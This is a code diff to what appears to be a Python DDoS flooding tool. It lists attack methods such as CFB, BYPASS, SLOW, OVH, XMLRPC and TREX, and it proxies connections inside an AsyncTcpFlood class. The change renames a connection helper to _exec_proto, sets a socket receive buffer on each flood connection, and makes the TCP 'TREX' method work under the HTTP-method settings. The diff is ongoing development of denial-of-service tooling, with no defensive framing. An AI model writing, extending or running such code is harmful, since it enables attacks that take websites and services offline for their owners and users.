@@ -8,7 +8,6 @@ from copy import copy
 from functools import partial
 from os import urandom as randbytes
 from socket import (SOL_SOCKET, SO_RCVBUF, inet_ntoa)
-import socket as _socket
 from ssl import CERT_NONE, SSLContext, create_default_context
 from string import ascii_letters
 from threading import Event
@@ -70,7 +69,8 @@ class Methods:
         "CFB", "BYPASS", "GET", "RGET", "HEAD", "RHEAD", "POST", "STRESS", "DYN", "SLOW",
         "NULL", "COOKIE", "PPS", "EVEN", "AVB", "OVH",
         "APACHE", "XMLRPC", "DOWNLOADER", "RHEX", "STOMP",
-        # XXX: this is not HTTP method but it's easier to test this way
+        # this is not HTTP method (rather TCP) but this way it works with --http-methods
+        # settings being applied to the entire set of targets
         "TREX" 
     }
     TCP_METHODS: Set[str] = {"TCP",}
@@ -327,7 +327,7 @@ class AsyncTcpFlood:
             conn = self._loop.create_connection(
                 flood_proto, host=proxy.proxy_host, port=proxy.proxy_port)
 
-        return await self._with_safe_close(conn, on_connect, on_close)
+        return await self._exec_proto(conn, on_connect, on_close)
 
     async def GET(self, on_connect=None) -> bool:
         payload: bytes = self.build_request()
@@ -635,13 +635,16 @@ class AsyncTcpFlood:
             conn = self._loop.create_connection(
                 trex_proto, host=proxy.proxy_host, port=proxy.proxy_port, ssl=None)
 
-        return await self._with_safe_close(conn, on_connect, on_close)
+        return await self._exec_proto(conn, on_connect, on_close)
 
-    async def _with_safe_close(self, conn, on_connect, on_close) -> bool:
+    async def _exec_proto(self, conn, on_connect, on_close) -> bool:
         transport = None
         try:
             async with async_timeout.timeout(self._settings.connect_timeout_seconds):
                 transport, _ = await conn
+            sock = transport.get_extra_info("socket")
+            if sock and hasattr(sock, "setsockopt"):
+                sock.setsockopt(SOL_SOCKET, SO_RCVBUF, self._settings.socket_rcvbuf)
         except asyncio.CancelledError as e:
             if on_connect:
                 on_connect.cancel()
